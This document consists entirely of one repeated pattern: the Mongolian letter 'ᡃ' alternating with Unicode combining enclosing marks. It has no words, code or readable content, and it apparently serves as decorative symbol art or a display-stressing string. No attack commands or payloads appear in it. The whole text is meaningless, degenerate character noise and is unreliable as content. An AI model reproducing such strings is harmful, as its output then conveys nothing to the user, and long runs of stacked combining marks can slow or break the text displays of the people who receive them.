⃢ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟